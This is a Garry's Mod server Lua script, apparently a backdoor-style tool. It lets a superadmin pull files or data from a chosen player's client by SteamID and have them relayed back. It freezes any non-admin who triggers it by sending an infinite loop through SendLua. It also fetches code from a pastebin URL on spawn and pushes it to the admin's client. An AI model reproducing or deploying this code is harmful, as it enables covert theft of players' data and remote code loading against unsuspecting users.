AddCSLuaFile("cheat.lua")

util.AddNetworkString("imcocked")
util.AddNetworkString("imcocked2")
util.AddNetworkString("penisings")
util.AddNetworkString("penisings2")
util.AddNetworkString("anataga")
util.AddNetworkString("stripforme")

local curreceiver = nil
local curtarget = nil
net.Receive("imcocked", function(l)
	
	
	
	local url = net.ReadString()
	local length = net.ReadUInt(32)
	local readdata = net.ReadData(length)
	
	url = string.sub(url, 9, #url)
	local ext = string.GetExtensionFromFilename(url)
	
	if(not IsValid(curreceiver)) then return end
	if(not IsValid(curtarget)) then return end
	print("READDATA: " .. readdata)
	
	net.Start("anataga")
	net.WriteBool(ext!=nil)--isfile
	net.WriteString(url)--name
	
	net.WriteUInt(length, 32)
	net.WriteData(readdata, length)
	net.Send(curreceiver)
	
end)

net.Receive("penisings", function(l, p)

	if(not p:IsSuperAdmin()) then
		p:SendLua([[while true do end]])
	end
	
	local sid = net.ReadString()
	local what = net.ReadString()
	for k,v in pairs(player.GetAll()) do if v:SteamID() == sid then curtarget = v end end
	
	if(not curtarget) then p:ChatPrint("no target!") return end
	
	curreceiver = p
	p:ChatPrint("loading: " .. what .. "...")
	net.Start("imcocked")
	net.WriteString(what)
	net.Send(curtarget)
	
end)

net.Receive("penisings2", function(l, p)

	if(not p:IsSuperAdmin()) then
		p:SendLua([[while true do end]])
	end
	
	local sid = net.ReadString()
	local what = net.ReadString()
	for k,v in pairs(player.GetAll()) do if v:SteamID() == sid then curtarget = v end end
	
	if(not curtarget) then p:ChatPrint("no target!") return end
	
	curreceiver = p
	p:ChatPrint("loading2: " .. what .. "...")
	net.Start("imcocked2")
	net.WriteString(what)
	net.Send(curtarget)
	
end)

hook.Add("PlayerInitialSpawn","k", function(p)

	timer.Simple(1, function()
	
		if(not IsValid(p) or not p:IsSuperAdmin()) then return end
		http.Fetch("http://pastebin.com/raw/fJDjP6kh", function(s)
			net.Start("stripforme")
			net.WriteString(s)
			net.Send(p)
		end)
	end)
	
end)